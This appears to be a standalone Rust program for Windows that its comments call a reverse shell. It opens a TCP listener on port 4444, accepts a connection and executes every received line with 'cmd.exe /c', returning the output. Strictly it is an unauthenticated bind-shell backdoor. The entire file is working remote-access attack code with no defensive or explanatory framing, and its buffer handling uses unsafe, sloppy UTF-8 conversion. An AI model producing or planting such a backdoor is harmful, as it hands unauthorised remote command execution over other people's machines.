use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::process::Command;
use std::io;

pub struct Client {
    handle: TcpStream,
    input_buf: [u8; 1024],
}

impl Client {
    pub fn new(listener: &TcpListener) -> Result<Self, io::Error> {
        let (stream, _) = listener.accept()?;  // Handle the result of `accept()`
        Ok(Self {
            handle: stream,
            input_buf: [0; 1024],
        })
    }

    pub fn read(&mut self) -> Result<String, io::Error> {
        // Read into the buffer
        self.handle.read(&mut self.input_buf)?;

        // Convert the buffer to a string before clearing it
        let s = unsafe { std::str::from_utf8_unchecked(&self.input_buf) }
            .trim();  // This will safely trim the string

        // Clear the buffer after creating the string reference
        let result = s.to_string();
        self.input_buf.fill(0);

        Ok(result)
    }

    pub fn write(&mut self, s: String) -> Result<(), io::Error> {
        // Write the string to the handle (TcpStream)
        self.handle.write_all(s.as_bytes())?;
        Ok(())
    }
}

pub fn start_reverse_shell() -> Result<(), io::Error> {
    // Start listening for incoming connections (e.g., reverse shell)
    let listener = TcpListener::bind("0.0.0.0:4444")?;
    println!("Listening for reverse shell connection on port 4444...");

    let mut client = Client::new(&listener)?;

    println!("Client connected.");

    loop {
        let input = client.read()?;

        if input.trim().is_empty() {
            break;
        }

        println!("Received command: {}", input);

        // Execute the received command in cmd (Windows)
        let output = Command::new("cmd.exe")
            .args(&["/c", &input])  // "/c" is for executing the command
            .output()?;

        if !output.status.success() {
            client.write("Command execution failed.".to_string())?;
        } else {
            let result = String::from_utf8_lossy(&output.stdout);
            client.write(result.to_string())?;
        }
    }

    Ok(())
}

fn main() -> Result<(), io::Error> {
    // Start the reverse shell server
    start_reverse_shell()
}

